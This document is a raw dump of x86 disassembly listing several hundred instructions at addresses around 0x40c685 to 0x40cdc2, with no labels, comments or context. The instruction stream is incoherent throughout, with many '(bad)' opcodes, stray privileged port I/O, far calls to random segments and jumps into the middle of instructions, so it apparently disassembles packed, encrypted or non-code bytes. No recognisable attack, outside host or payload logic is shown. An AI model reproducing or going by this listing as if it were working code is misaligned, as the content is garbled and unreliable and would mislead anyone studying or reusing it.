  40c685:	mov    esi,0xa3ef401e
  40c68a:	call   0x4ff:0xe0bfcc85
  40c691:	mov    bh,0x8e
  40c693:	popa   
  40c694:	bound  esp,QWORD PTR [ecx]
  40c696:	mov    WORD PTR [ebp+0x48],gs
  40c699:	cmp    eax,0xf078f6cc
  40c69e:	push   edx
  40c69f:	aad    0xbe
  40c6a1:	ds cli 
  40c6a3:	pop    esp
  40c6a4:	xchg   ebx,eax
  40c6a5:	(bad)  
  40c6a6:	mov    ?,WORD PTR [ebx+0x6a80461e]
  40c6ac:	ret    0x14d1
  40c6af:	inc    BYTE PTR [ecx+0x2a7fe7d4]
  40c6b5:	xor    ah,BYTE PTR [eax-0x3f]
  40c6b8:	ret    
  40c6b9:	sbb    eax,0x814d0c44
  40c6be:	dec    esi
  40c6bf:	push   ebp
  40c6c0:	mov    edx,0x9c38bed4
  40c6c5:	jo     0x40c69f
  40c6c7:	fdiv   DWORD PTR [esi+0x7e]
  40c6ca:	inc    esp
  40c6cb:	(bad)
  40c6cf:	jl     0x40c725
  40c6d1:	pusha  
  40c6d2:	mov    bl,0x3d
  40c6d4:	ins    BYTE PTR es:[edi],dx
  40c6d5:	addr16 xchg ecx,eax
  40c6d7:	enter  0x84cf,0xf2
  40c6db:	not    BYTE PTR [esi-0x4f]
  40c6de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6df:	(bad)  
  40c6e0:	int3   
  40c6e1:	and    BYTE PTR [edx+0x1a],ch
  40c6e4:	cmp    BYTE PTR ds:[edx-0x1924fa7d],bl
  40c6eb:	rol    cl,0x36
  40c6ee:	neg    ah
  40c6f0:	je     0x40c69d
  40c6f2:	ins    DWORD PTR es:[edi],dx
  40c6f3:	xchg   edi,eax
  40c6f4:	mov    dl,0x2e
  40c6f6:	mov    edx,0xef7d1f0a
  40c6fb:	scas   eax,DWORD PTR es:[edi]
  40c6fc:	ja     0x40c716
  40c6fe:	ficom  DWORD PTR [ecx-0xe79f34]
  40c704:	sub    DWORD PTR ds:0x777abf4e,eax
  40c70a:	stc    
  40c70b:	test   BYTE PTR [ecx-0x2d],0xdb
  40c70f:	or     DWORD PTR [ebp+eax*2-0x4f],edx
  40c713:	lods   eax,DWORD PTR ds:[esi]
  40c714:	mov    eax,0x61bdeee5
  40c719:	dec    esp
  40c71a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c71b:	jno    0x40c781
  40c71d:	and    eax,0xdcce195f
  40c722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c723:	cdq    
  40c724:	retf   
  40c725:	cmovl  ecx,DWORD PTR [eax+0x5c]
  40c729:	int3   
  40c72a:	in     eax,dx
  40c72b:	jbe    0x40c76b
  40c72d:	fcom   DWORD PTR ds:0xc985d437
  40c733:	in     al,0x2c
  40c735:	js     0x40c6c8
  40c737:	arpl   WORD PTR [ebx+0x5046f59e],cx
  40c73d:	mov    ah,0x6e
  40c73f:	inc    eax
  40c740:	mov    edi,0xe82a35d7
  40c745:	enter  0x9166,0x1
  40c749:	pop    edi
  40c74a:	aas    
  40c74b:	pushf  
  40c74c:	pop    eax
  40c74d:	stos   BYTE PTR es:[edi],al
  40c74e:	ror    BYTE PTR [ebx],cl
  40c750:	das    
  40c751:	or     dh,al
  40c753:	test   eax,0xa5981931
  40c758:	mov    ebx,0xf6a9a9dc
  40c75d:	stc    
  40c75e:	sub    BYTE PTR [ebx+edx*1-0xd55ed66],dh
  40c765:	pop    es
  40c766:	inc    edi
  40c767:	(bad)  
  40c769:	inc    BYTE PTR [edi+edx*4+0x14]
  40c76d:	push   ecx
  40c76e:	mov    ebp,0x13e7655b
  40c773:	pop    ecx
  40c774:	xchg   DWORD PTR [ebp-0x4a],edi
  40c777:	or     DWORD PTR [eax-0x54],0x72
  40c77b:	int3   
  40c77c:	rcl    cl,1
  40c77e:	das    
  40c77f:	stos   DWORD PTR es:[edi],eax
  40c780:	mov    edx,0xa5f430a4
  40c785:	xchg   DWORD PTR [esi-0x40cb74a5],eax
  40c78b:	mov    eax,ds:0x6226d99d
  40c790:	add    eax,0xe2e4f55e
  40c795:	push   ds
  40c796:	aad    0x34
  40c798:	xchg   ecx,eax
  40c799:	js     0x40c780
  40c79b:	and    al,0xee
  40c79d:	loop   0x40c7c8
  40c79f:	cmp    DWORD PTR [edx-0x11],esi
  40c7a2:	bound  edi,QWORD PTR [ebx-0x47]
  40c7a5:	and    al,0xa
  40c7a7:	adc    eax,0x5ae95dbe
  40c7ac:	push   eax
  40c7ad:	xor    bl,BYTE PTR [ecx]
  40c7af:	cwde   
  40c7b0:	sub    al,0xf3
  40c7b2:	retf   
  40c7b3:	popa   
  40c7b4:	mov    edx,0x94f77210
  40c7b9:	fwait
  40c7ba:	scas   eax,DWORD PTR es:[edi]
  40c7bb:	fucomip st,st(5)
  40c7bd:	mov    al,ch
  40c7bf:	push   esp
  40c7c0:	sbb    edi,eax
  40c7c2:	push   es
  40c7c3:	loope  0x40c803
  40c7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c6:	pop    ss
  40c7c7:	add    DWORD PTR [edx+eax*1-0x62b8223d],ecx
  40c7ce:	push   0x4c
  40c7d0:	xchg   ebp,eax
  40c7d1:	cmp    DWORD PTR [esi],esp
  40c7d3:	test   eax,0x96e87ced
  40c7d8:	cmp    eax,0xa9a5d6eb
  40c7dd:	sti    
  40c7de:	jp     0x40c775
  40c7e0:	xchg   ebx,eax
  40c7e1:	out    0xd7,al
  40c7e3:	dec    esp
  40c7e4:	pop    esi
  40c7e5:	or     BYTE PTR [ecx-0x7cbb85f0],bh
  40c7eb:	std    
  40c7ec:	mov    edx,0x3f347787
  40c7f1:	sar    DWORD PTR [esi+0x5f79027f],cl
  40c7f7:	jb     0x40c82e
  40c7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7fa:	(bad)  
  40c7fb:	dec    edx
  40c7fc:	fucompp 
  40c7fe:	mov    ah,0x98
  40c800:	sbb    al,0x46
  40c802:	mov    edi,gs
  40c804:	inc    ebp
  40c805:	xor    cl,ah
  40c807:	addr16 jne 0x40c849
  40c80a:	sbb    eax,DWORD PTR [edi-0x16e0c2c7]
  40c810:	or     eax,0x85d1351b
  40c815:	and    eax,DWORD PTR [ecx+0x7cbc425]
  40c81b:	pop    edi
  40c81c:	cmp    eax,0x4e16b6e6
  40c821:	and    DWORD PTR [edx],edi
  40c823:	jle    0x40c894
  40c825:	fldenv [ebx]
  40c827:	fst    DWORD PTR [eax+ecx*2+0x51b5b04a]
  40c82e:	jno    0x40c85c
  40c830:	(bad)  
  40c831:	pop    ebp
  40c832:	lods   eax,DWORD PTR ds:[esi]
  40c833:	cmp    DWORD PTR [eax+0x74],ebx
  40c836:	fsub   QWORD PTR [edx+edx*1-0x4d]
  40c83a:	mov    esi,DWORD PTR [ecx+0x39d56b05]
  40c840:	mov    esp,esi
  40c842:	das    
  40c843:	adc    BYTE PTR [eax-0x8df257d],dh
  40c849:	jno    0x40c859
  40c84b:	or     dl,BYTE PTR [esi+0xf65992e]
  40c851:	pop    ds
  40c852:	xchg   ecx,eax
  40c853:	inc    edi
  40c854:	scas   al,BYTE PTR es:[edi]
  40c855:	mov    esp,0x4a7e3eda
  40c85a:	sub    BYTE PTR [esi],ah
  40c85c:	mov    ebp,0x3fb9afdd
  40c861:	cdq    
  40c862:	push   cs
  40c863:	stos   DWORD PTR es:[edi],eax
  40c864:	mov    al,0xb1
  40c866:	or     eax,DWORD PTR ds:0x2112278
  40c86c:	dec    ecx
  40c86d:	adc    WORD PTR [edi-0x53aaa659],bx
  40c874:	add    al,0x27
  40c876:	dec    ebp
  40c877:	jmp    0x40c7f9
  40c879:	loop   0x40c861
  40c87b:	sti    
  40c87c:	or     eax,0x24135ac0
  40c881:	inc    edx
  40c882:	and    esp,DWORD PTR [esi+0x1d85b097]
  40c888:	inc    ebp
  40c889:	test   BYTE PTR [edx+0x1f],ch
  40c88c:	cmp    cl,BYTE PTR [ecx-0x4d]
  40c88f:	push   edx
  40c890:	call   0xcac8296d
  40c895:	cmp    DWORD PTR [edx-0x4d9c2927],0x14
  40c89c:	shl    BYTE PTR [ebx],0x8
  40c89f:	sbb    eax,0xe3ef91de
  40c8a4:	cmp    ebp,DWORD PTR [ebx+0x1a]
  40c8a7:	aam    0x7c
  40c8a9:	mov    eax,0xfd159f21
  40c8ae:	xchg   esi,eax
  40c8af:	xchg   ebx,eax
  40c8b0:	rcr    DWORD PTR [ebp+0x1bb1ef6d],1
  40c8b6:	jo     0x40c88e
  40c8b8:	retf   
  40c8b9:	popw   ds
  40c8bb:	sub    eax,0x12712286
  40c8c0:	loopne 0x40c86e
  40c8c2:	std    
  40c8c3:	dec    ebx
  40c8c4:	mov    eax,DWORD PTR [ecx-0x7e]
  40c8c7:	jmp    0xea2605aa
  40c8cc:	xor    dl,bh
  40c8ce:	pop    es
  40c8cf:	dec    ebx
  40c8d0:	xchg   edx,eax
  40c8d1:	and    ebx,DWORD PTR [edx-0x4a8316b6]
  40c8d7:	adc    DWORD PTR [eax-0x31],ebp
  40c8da:	mov    DWORD PTR ds:0x12ce24d6,eax
  40c8e0:	outs   dx,BYTE PTR ds:[esi]
  40c8e1:	add    DWORD PTR [eax-0x4c],ecx
  40c8e4:	outs   dx,DWORD PTR ds:[esi]
  40c8e5:	std    
  40c8e6:	jo     0x40c8f1
  40c8e8:	cdq    
  40c8e9:	mov    ebp,0x4771af54
  40c8ee:	in     eax,dx
  40c8ef:	dec    eax
  40c8f0:	into   
  40c8f1:	lock add al,0xec
  40c8f4:	mov    cl,0x73
  40c8f6:	aam    0x2c
  40c8f8:	pop    eax
  40c8f9:	jns    0x40c96b
  40c8fb:	cmp    BYTE PTR [ecx-0x53],ch
  40c8fe:	push   ds
  40c8ff:	lods   eax,DWORD PTR ds:[esi]
  40c900:	dec    esi
  40c901:	xchg   ebx,eax
  40c902:	jp     0x40c95a
  40c904:	jb     0x40c8ac
  40c906:	iret   
  40c907:	loopne 0x40c8e7
  40c909:	mov    bl,0xab
  40c90b:	stos   DWORD PTR es:[edi],eax
  40c90c:	(bad)  
  40c90d:	in     eax,0x9b
  40c90f:	outs   dx,BYTE PTR ds:[esi]
  40c910:	xlat   BYTE PTR ds:[ebx]
  40c911:	jns    0x40c977
  40c913:	pop    esp
  40c914:	fstp   TBYTE PTR [esp+ebx*1+0x3]
  40c918:	and    ebp,DWORD PTR [ebp+0x29c55ede]
  40c91e:	arpl   WORD PTR [ebx-0x2f],bp
  40c921:	or     ebp,esp
  40c923:	adc    BYTE PTR [ecx],bl
  40c925:	sub    esp,0x59e6bb0
  40c92b:	in     eax,dx
  40c92c:	jecxz  0x40c955
  40c92e:	test   DWORD PTR [esi-0x36],ebp
  40c931:	push   ss
  40c932:	das    
  40c933:	out    0x49,eax
  40c935:	das    
  40c936:	dec    ebx
  40c938:	sub    DWORD PTR ds:0x40f93e68,ecx
  40c93e:	int3   
  40c93f:	jecxz  0x40c968
  40c941:	les    ebx,FWORD PTR [eax-0x30]
  40c944:	xlat   BYTE PTR ds:[ebx]
  40c945:	repz xor BYTE PTR ds:[eax+0x613d2448],ah
  40c94d:	and    eax,0x415e0c79
  40c952:	gs and dl,dl
  40c955:	jg     0x40c8e6
  40c957:	(bad)  
  40c958:	sub    al,0x6f
  40c95a:	lods   eax,DWORD PTR ds:[esi]
  40c95b:	fcmovbe st,st(7)
  40c95d:	or     DWORD PTR [esi],0xffffff99
  40c960:	pop    ds
  40c961:	and    cl,BYTE PTR ds:0x8b106375
  40c967:	inc    ecx
  40c968:	sub    esi,DWORD PTR [esi]
  40c96a:	(bad)  
  40c96c:	data16 cmp dh,BYTE PTR [edi-0x6ec0295d]
  40c973:	mov    al,ds:0xc30a59e0
  40c978:	clc    
  40c979:	pop    ss
  40c97a:	js     0x40c9e1
  40c97c:	and    al,0xef
  40c97e:	sahf   
  40c97f:	loop   0x40c9a8
  40c981:	pop    es
  40c982:	push   eax
  40c983:	out    dx,al
  40c984:	jnp    0x40ca05
  40c986:	cmp    bh,BYTE PTR [edx-0x54]
  40c989:	shl    ch,1
  40c98b:	nop
  40c98c:	xchg   esp,eax
  40c98d:	xor    ebx,esp
  40c98f:	and    DWORD PTR [ecx+ecx*4],edi
  40c992:	pop    ds
  40c993:	dec    edx
  40c994:	jns    0x40c95e
  40c996:	jb     0x40c9ab
  40c998:	lods   al,BYTE PTR ds:[esi]
  40c999:	pop    esp
  40c99a:	rol    BYTE PTR [eax],cl
  40c99c:	fidiv  DWORD PTR [edx+edx*1]
  40c99f:	fprem  
  40c9a1:	jbe    0x40c9cf
  40c9a3:	daa    
  40c9a4:	or     cl,BYTE PTR [ebx+0x20]
  40c9a7:	push   eax
  40c9a8:	push   cs
  40c9a9:	lods   eax,DWORD PTR ds:[esi]
  40c9aa:	les    ebx,FWORD PTR [ebp-0xe]
  40c9ad:	add    eax,0xdd3e85ef
  40c9b2:	xchg   edi,eax
  40c9b3:	test   eax,0xeaa67567
  40c9b8:	lock jg 0x40c992
  40c9bb:	sub    esi,DWORD PTR [esi]
  40c9bd:	jb     0x40ca02
  40c9bf:	jmp    0x129543b4
  40c9c4:	mov    al,ds:0x996682a8
  40c9c9:	inc    ebx
  40c9ca:	fstp   TBYTE PTR [ebp+0x1090bbb9]
  40c9d0:	inc    ecx
  40c9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9d2:	sub    DWORD PTR [esi+ebp*8],eax
  40c9d5:	test   dl,al
  40c9d7:	js     0x40c984
  40c9d9:	fisubr DWORD PTR [ecx-0xa]
  40c9dc:	test   eax,0xea1344cd
  40c9e1:	pop    esi
  40c9e2:	dec    esp
  40c9e3:	jecxz  0x40ca22
  40c9e5:	jnp    0x40c989
  40c9e7:	cmp    al,0x89
  40c9e9:	imul   esi,DWORD PTR [eax],0xffffffc5
  40c9ec:	mov    ds:0xd964e8cf,al
  40c9f1:	retf   
  40c9f2:	or     eax,edi
  40c9f4:	rol    BYTE PTR [edi],0x95
  40c9f7:	out    0x2,eax
  40c9f9:	push   ds
  40c9fa:	xchg   ecx,eax
  40c9fb:	push   ebp
  40c9fc:	cmp    eax,0xcf85c677
  40ca01:	loope  0x40ca26
  40ca03:	sbb    BYTE PTR [ebx],al
  40ca05:	jnp    0x40c9f5
  40ca07:	xchg   ecx,eax
  40ca08:	sub    DWORD PTR [eax+0x4279595a],edx
  40ca0e:	js     0x40c9b1
  40ca10:	mov    al,0x3a
  40ca12:	rcl    eax,cl
  40ca14:	mov    edx,0x93a7feba
  40ca19:	cmp    BYTE PTR [ebp-0x2e],0xeb
  40ca1d:	mov    dl,dh
  40ca1f:	fisttp DWORD PTR [ecx-0x2009173b]
  40ca25:	retf   0x185d
  40ca28:	adc    edi,esp
  40ca2a:	pop    esi
  40ca2b:	imul   DWORD PTR [ebp+eiz*1+0x42]
  40ca2f:	push   0xcdb45ba3
  40ca34:	and    ah,BYTE PTR [ecx]
  40ca36:	xchg   edx,eax
  40ca37:	mov    bl,0xc9
  40ca39:	int    0x3f
  40ca3b:	test   BYTE PTR [ebp-0xfa0e41d],0xe4
  40ca42:	jmp    0x40ca6a
  40ca44:	adc    eax,0xcb6cb261
  40ca49:	jne    0x40ca7e
  40ca4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4c:	sahf   
  40ca4d:	out    dx,eax
  40ca4e:	sahf   
  40ca4f:	pusha  
  40ca50:	out    0x51,eax
  40ca52:	push   ds
  40ca53:	enter  0x6bc2,0x78
  40ca57:	scas   eax,DWORD PTR es:[edi]
  40ca58:	sbb    al,0xcb
  40ca5a:	xlat   BYTE PTR ds:[ebx]
  40ca5b:	add    al,0xb2
  40ca5d:	inc    edx
  40ca5e:	cli    
  40ca5f:	shl    DWORD PTR [bp+si],cl
  40ca62:	inc    edi
  40ca63:	ins    DWORD PTR es:[edi],dx
  40ca64:	dec    edx
  40ca65:	sahf   
  40ca66:	mov    WORD PTR [edx+ebx*1-0x75],fs
  40ca6a:	fisubr DWORD PTR [eax+0x3a]
  40ca6d:	push   esi
  40ca6e:	mov    al,0x65
  40ca70:	int3   
  40ca71:	adc    eax,0xa26cca8d
  40ca76:	popf   
  40ca77:	aaa    
  40ca78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca79:	inc    edx
  40ca7a:	(bad)  
  40ca7b:	push   0x192ee8dc
  40ca80:	push   0x28ac9f89
  40ca85:	sbb    DWORD PTR [eax],ebx
  40ca87:	adc    esp,edi
  40ca89:	push   edx
  40ca8a:	jo     0x40cad3
  40ca8c:	dec    ebp
  40ca8d:	and    ebx,ecx
  40ca8f:	xchg   dl,bh
  40ca91:	cmp    ah,ah
  40ca93:	jns    0x40cae5
  40ca95:	push   ebx
  40ca96:	scas   al,BYTE PTR es:[edi]
  40ca97:	add    eax,DWORD PTR [ecx-0x39]
  40ca9a:	and    DWORD PTR [edx-0x1a675f5e],0xbdec12b0
  40caa4:	add    edx,DWORD PTR [esp+edx*2-0x7812bdd7]
  40caab:	lock ret 0x1cba
  40caaf:	push   ss
  40cab0:	test   al,0x93
  40cab2:	fidiv  WORD PTR [edx-0x3af89930]
  40cab8:	mov    al,ds:0xda8cdc5a
  40cabd:	imul   bx,WORD PTR [esi],0x65
  40cac1:	mov    edi,0x2cb538ab
  40cac6:	daa    
  40cac7:	push   cs
  40cac8:	push   esi
  40cac9:	jno    0x40cad5
  40cacb:	add    DWORD PTR [eax-0x5a35aaa1],edi
  40cad1:	mov    dl,0x5a
  40cad3:	imul   ebx,DWORD PTR [ebx+0x70],0x15f5fc1a
  40cada:	xor    ebx,DWORD PTR es:[ecx+0xd9df212]
  40cae1:	or     eax,0xb048c934
  40cae6:	pop    esi
  40cae7:	out    dx,al
  40cae8:	call   0xdca1d0d8
  40caed:	loopne 0x40ca9c
  40caef:	frstor [edx]
  40caf1:	or     ebx,DWORD PTR [ebx-0x10]
  40caf4:	lods   al,BYTE PTR ds:[esi]
  40caf5:	push   ecx
  40caf6:	(bad)  
  40caf7:	addr16 pop eax
  40caf9:	es sti 
  40cafb:	icebp  
  40cafc:	xchg   ebp,eax
  40cafd:	cmp    DWORD PTR [eax-0x7519d01],0xffffffb2
  40cb04:	retf   0xe80d
  40cb07:	fisubr WORD PTR [eax-0x9]
  40cb0a:	int    0x29
  40cb0c:	mov    DWORD PTR [ebp-0x5fa9f035],esi
  40cb12:	aaa    
  40cb13:	dec    edx
  40cb14:	sbb    BYTE PTR [eax-0x20],bh
  40cb17:	(bad)  [edi]
  40cb19:	hlt    
  40cb1a:	ss dec esi
  40cb1c:	mov    ah,BYTE PTR [ecx]
  40cb1e:	push   eax
  40cb1f:	ret    0x209
  40cb22:	jl     0x40caa6
  40cb24:	xor    cl,BYTE PTR [esi+eiz*8+0x5d0b40df]
  40cb2b:	arpl   WORD PTR [ebx-0x5fb5ac17],bp
  40cb31:	test   BYTE PTR [edi-0x78],ah
  40cb34:	stos   BYTE PTR es:[edi],al
  40cb35:	pop    esp
  40cb36:	repz mov dl,0x6
  40cb39:	sbb    ebx,DWORD PTR [ebp+0x7e]
  40cb3c:	lods   eax,DWORD PTR ds:[esi]
  40cb3d:	fchs   
  40cb3f:	jp     0x40caee
  40cb41:	push   es
  40cb42:	pusha  
  40cb43:	mov    es,WORD PTR [ebp+0x457696c3]
  40cb49:	shl    BYTE PTR [ebp+0x7e],cl
  40cb4c:	lea    ecx,[ecx]
  40cb4e:	aam    0xe4
  40cb50:	jae    0x40cb66
  40cb52:	xchg   ecx,eax
  40cb53:	dec    ebp
  40cb54:	stos   DWORD PTR es:[edi],eax
  40cb55:	ret    
  40cb56:	mov    esp,DWORD PTR [ebx+0x27]
  40cb59:	dec    eax
  40cb5a:	call   0x7432:0x2f53c662
  40cb61:	imul   DWORD PTR [eax+0x7033444f]
  40cb67:	xor    eax,DWORD PTR [edx]
  40cb69:	iret   
  40cb6a:	inc    esp
  40cb6b:	pop    edi
  40cb6c:	add    eax,0xcb24ba20
  40cb71:	mov    al,0x5f
  40cb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb74:	sbb    DWORD PTR [edx],ebx
  40cb76:	pop    ebp
  40cb77:	and    DWORD PTR [ebp+0x1224b1e2],edi
  40cb7d:	jmp    0x40cb45
  40cb7f:	pop    esi
  40cb80:	jo     0x40cbc6
  40cb82:	xchg   ebp,eax
  40cb83:	add    DWORD PTR [ecx],ebx
  40cb85:	repz and eax,0xd5a7ea25
  40cb8b:	(bad)  
  40cb8c:	adc    al,0x81
  40cb8e:	xchg   esi,eax
  40cb8f:	clc    
  40cb90:	or     al,0x95
  40cb92:	jbe    0x40cb95
  40cb94:	pop    ax
  40cb96:	fnsave [edx-0x73c1b5e1]
  40cb9c:	add    edi,DWORD PTR [edi+0x50d380f5]
  40cba2:	scas   eax,DWORD PTR es:[edi]
  40cba3:	sub    DWORD PTR [ecx],eax
  40cba5:	retf   0x9210
  40cba8:	jne    0x40cbb4
  40cbaa:	daa    
  40cbab:	xor    DWORD PTR [ecx-0x5bbe755f],ebp
  40cbb1:	inc    edi
  40cbb2:	and    BYTE PTR [esi],bl
  40cbb4:	and    al,0x68
  40cbb6:	pop    ss
  40cbb7:	shr    DWORD PTR [eax-0x585cd98f],0x2c
  40cbbe:	ins    BYTE PTR es:[edi],dx
  40cbbf:	outs   dx,DWORD PTR ds:[esi]
  40cbc0:	inc    ebx
  40cbc1:	mov    ebx,0xcbca3d5c
  40cbc6:	adc    cl,BYTE PTR [ecx-0x23]
  40cbc9:	daa    
  40cbca:	mov    esp,0x3e350af0
  40cbcf:	dec    ecx
  40cbd0:	out    0xf1,eax
  40cbd2:	mov    esi,0x13bb3fc7
  40cbd7:	xchg   edx,eax
  40cbd8:	adc    eax,0xd9f5204
  40cbdd:	mov    dl,0x7
  40cbdf:	sti    
  40cbe0:	outs   dx,DWORD PTR ds:[esi]
  40cbe1:	pop    esp
  40cbe2:	ret    0x4bf8
  40cbe5:	sub    al,0x50
  40cbe7:	stos   DWORD PTR es:[edi],eax
  40cbe8:	je     0x40cb6e
  40cbea:	std    
  40cbeb:	xchg   DWORD PTR [ecx+edi*4],ebp
  40cbee:	jns    0x40cb92
  40cbf0:	mov    DWORD PTR [ecx-0x32],ebx
  40cbf3:	pop    edx
  40cbf4:	inc    edi
  40cbf5:	mov    dl,0xa3
  40cbf7:	in     al,0x61
  40cbf9:	fmul   QWORD PTR [edx]
  40cbfb:	sbb    ebx,DWORD PTR [ebx+0x4f2804a6]
  40cc01:	sbb    eax,0x4eaa99ba
  40cc06:	cmp    ebx,ebp
  40cc08:	das    
  40cc09:	jle    0x40cc46
  40cc0b:	ja     0x40cba8
  40cc0d:	inc    ebp
  40cc0e:	mov    edx,0x61eabe32
  40cc13:	xchg   BYTE PTR [edi-0x2c],dl
  40cc16:	test   eax,0x110c09b
  40cc1b:	test   DWORD PTR [eax-0x6d],esi
  40cc1e:	fidivr DWORD PTR [esi]
  40cc20:	and    BYTE PTR [eax+0x3],bh
  40cc23:	das    
  40cc24:	fld    DWORD PTR [esi]
  40cc26:	fdivr  DWORD PTR [ecx-0x222afcd]
  40cc2c:	cld    
  40cc2d:	adc    DWORD PTR [edi+edx*2-0x49919817],ecx
  40cc34:	out    0xdc,al
  40cc36:	xor    ecx,DWORD PTR [ebx-0x1]
  40cc39:	ss cld 
  40cc3b:	enter  0x6098,0xc2
  40cc3f:	mov    cl,0x59
  40cc41:	pop    edi
  40cc42:	stos   BYTE PTR es:[edi],al
  40cc43:	mov    eax,0xea72d38f
  40cc48:	jl     0x40cc44
  40cc4a:	cld    
  40cc4b:	dec    esp
  40cc4c:	std    
  40cc4d:	push   edi
  40cc4e:	add    al,0x62
  40cc50:	sub    dl,0xf8
  40cc53:	cmp    BYTE PTR [edx],0x91
  40cc56:	fdivp  st(3),st
  40cc58:	into   
  40cc59:	push   esi
  40cc5a:	leave  
  40cc5b:	lock jl 0x40cca5
  40cc5e:	xchg   edi,eax
  40cc5f:	add    BYTE PTR [ecx],ah
  40cc61:	adc    al,0x7a
  40cc63:	push   0xfd00ec77
  40cc68:	pop    ecx
  40cc69:	int3   
  40cc6a:	jns    0x40ccd7
  40cc6c:	adc    cl,bl
  40cc6e:	cmp    DWORD PTR [esi-0x12],esp
  40cc71:	idiv   DWORD PTR [edi+0x1f4f475]
  40cc77:	adc    DWORD PTR [ebx],esp
  40cc79:	or     al,0xbf
  40cc7b:	popa   
  40cc7c:	shr    DWORD PTR [edx+0x73],cl
  40cc7f:	jnp    0x40cc56
  40cc81:	call   0x867e:0x5b27e703
  40cc88:	in     eax,0x5
  40cc8a:	ja     0x40cc1b
  40cc8c:	sbb    BYTE PTR [ebx],bl
  40cc8e:	sub    DWORD PTR [edx+0x54],ebp
  40cc91:	xchg   esi,eax
  40cc92:	push   cs
  40cc93:	xor    al,0xc2
  40cc95:	popf   
  40cc96:	in     al,dx
  40cc97:	div    DWORD PTR ds:[edx-0x58b411a2]
  40cc9e:	inc    ecx
  40cc9f:	icebp  
  40cca0:	jmp    0x40cc80
  40cca2:	adc    ch,al
  40cca4:	pop    es
  40cca5:	das    
  40cca6:	call   0x2aec86fc
  40ccab:	jnp    0x40ccda
  40ccad:	and    BYTE PTR ds:0x7a3e054e,ah
  40ccb3:	jbe    0x40cc6b
  40ccb5:	mov    eax,ds:0x13464132
  40ccba:	scas   al,BYTE PTR es:[edi]
  40ccbb:	xchg   DWORD PTR [eax+0x54],edx
  40ccbe:	sbb    al,0xef
  40ccc0:	jo     0x40ccf4
  40ccc2:	into   
  40ccc3:	or     bl,cl
  40ccc5:	aaa    
  40ccc6:	jne    0x40cd03
  40ccc8:	daa    
  40ccc9:	imul   esi,DWORD PTR [eax+0x620e78d2],0x74809518
  40ccd3:	stos   DWORD PTR es:[edi],eax
  40ccd4:	les    ebx,FWORD PTR [eax]
  40ccd6:	ficomp WORD PTR ss:[esi]
  40ccd9:	or     esi,esi
  40ccdb:	dec    ebp
  40ccdc:	(bad)  
  40ccdd:	repnz and eax,0xdccef7ca
  40cce3:	sbb    cl,dl
  40cce5:	sbb    BYTE PTR [edx-0x3c],0x4a
  40cce9:	xchg   BYTE PTR [ecx-0x19fe6fad],al
  40ccef:	sbb    DWORD PTR [ebx],eax
  40ccf1:	imul   edi,edi,0xc242e5d9
  40ccf7:	xlat   BYTE PTR ds:[ebx]
  40ccf8:	ins    BYTE PTR es:[edi],dx
  40ccf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccfa:	icebp  
  40ccfb:	ret    0xece3
  40ccfe:	mov    eax,0xe148c942
  40cd03:	lods   al,BYTE PTR ds:[esi]
  40cd04:	dec    esp
  40cd05:	dec    ebp
  40cd06:	xor    cl,BYTE PTR [ebx-0x6b]
  40cd09:	jo     0x40cd2d
  40cd0b:	call   0x791b2d6
  40cd10:	lock in al,dx
  40cd12:	ret    0xfa78
  40cd15:	dec    edx
  40cd16:	cmp    DWORD PTR [ecx-0x2150f90c],0x4e
  40cd1d:	cwde   
  40cd1e:	mov    eax,0x4e17bc3
  40cd23:	mov    BYTE PTR [esi+edi*8-0x5d],dl
  40cd27:	jne    0x40ccbf
  40cd29:	retf   
  40cd2a:	cmp    bl,BYTE PTR [edx+0x46]
  40cd2d:	sbb    al,0xf7
  40cd2f:	dec    ebx
  40cd30:	shl    DWORD PTR [ecx],0x6a
  40cd33:	test   BYTE PTR [edx+0x60],ah
  40cd36:	sar    BYTE PTR [ebp-0x735e3ab],1
  40cd3c:	jg     0x40cd86
  40cd3e:	popf   
  40cd3f:	gs pop edi
  40cd41:	inc    ecx
  40cd42:	or     al,BYTE PTR [eax]
  40cd44:	mov    dh,0xf5
  40cd46:	push   ecx
  40cd47:	adc    esp,esi
  40cd49:	cmp    al,0x6b
  40cd4b:	enter  0xe8d0,0x6e
  40cd4f:	mov    edi,eax
  40cd51:	xchg   esp,eax
  40cd52:	pop    edi
  40cd53:	enter  0xab3f,0xa1
  40cd57:	mov    eax,ds:0x715a11e6
  40cd5c:	push   ecx
  40cd5d:	(bad)  
  40cd5e:	xchg   ebx,eax
  40cd5f:	repnz out 0xb9,al
  40cd62:	enter  0x3b25,0xec
  40cd66:	(bad)  
  40cd67:	sbb    BYTE PTR [eax-0x621b5b0d],bl
  40cd6d:	and    al,0x79
  40cd6f:	jno    0x40cd8c
  40cd71:	leave  
  40cd72:	sbb    BYTE PTR [edx+0x32a32c3e],ch
  40cd78:	lods   al,BYTE PTR ds:[esi]
  40cd79:	add    BYTE PTR [ebx+0x1ff29752],0x12
  40cd80:	xchg   edi,eax
  40cd81:	cmp    DWORD PTR [ebx],ebp
  40cd83:	outs   dx,BYTE PTR ds:[esi]
  40cd84:	(bad)  
  40cd85:	sar    ebx,cl
  40cd87:	shl    ah,cl
  40cd89:	or     bh,cl
  40cd8b:	dec    esp
  40cd8c:	(bad)  
  40cd8e:	mov    dh,0x81
  40cd90:	test   DWORD PTR [ebx-0x40752821],0x7f0721ce
  40cd9a:	mov    ebx,0xa353477e
  40cd9f:	sahf   
  40cda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda1:	mov    ds:0x7854af46,eax
  40cda6:	jl     0x40ce0b
  40cda8:	add    eax,DWORD PTR [edx-0x9be3610]
  40cdae:	jb     0x40cd46
  40cdb0:	sti    
  40cdb1:	inc    edi
  40cdb2:	out    0x42,al
  40cdb4:	mov    esi,0x73d83b64
  40cdb9:	in     eax,0x44
  40cdbb:	in     al,0xf2
  40cdbd:	mov    bh,0x91
  40cdbf:	inc    ecx
  40cdc0:	add    dl,ch
  40cdc2:	mov    ch,0x2c
